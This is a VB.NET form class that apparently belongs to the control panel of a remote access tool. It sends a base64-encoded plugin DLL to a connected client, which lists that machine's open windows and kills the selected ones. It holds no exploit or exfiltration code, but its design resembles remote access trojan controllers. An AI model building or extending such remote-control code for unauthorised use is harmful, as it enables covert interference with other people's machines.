Imports System.IO
Public Class ACT
    Public C As Client

    Private Sub ACT_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Timer2.Start()
        re()
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Try
            ToolStripStatusLabel2.Text = "Selected [" & ListView1.SelectedItems.Count.ToString & "]"
            ToolStripStatusLabel1.Text = "Windows [" & ListView1.Items.Count & "]"
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            If Not C.IsConnected Then
                Me.Close()
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub
    Sub re()
        Try
            ListView1.Items.Clear()
            RefreshToolStripMenuItem.Enabled = False
            KillToolStripMenuItem.Enabled = False
            Dim B As Byte() = SB("ACTG" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\ACTWindows.dll")))

            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)

        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        re()
    End Sub


    Private Sub ContextMenuStrip1_Opening(sender As Object, e As System.ComponentModel.CancelEventArgs) Handles ContextMenuStrip1.Opening

    End Sub

    Private Sub KillToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KillToolStripMenuItem.Click
        Try
            Dim sss As String
            sss = Nothing
            For Each item As ListViewItem In ListView1.SelectedItems
                sss += item.SubItems(1).Text & "|+++W|||"
            Next
            Dim B As Byte() = SB("killAct" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\ACTWindows.dll")) & Settings.SPL & sss)

            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)

        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub
End Class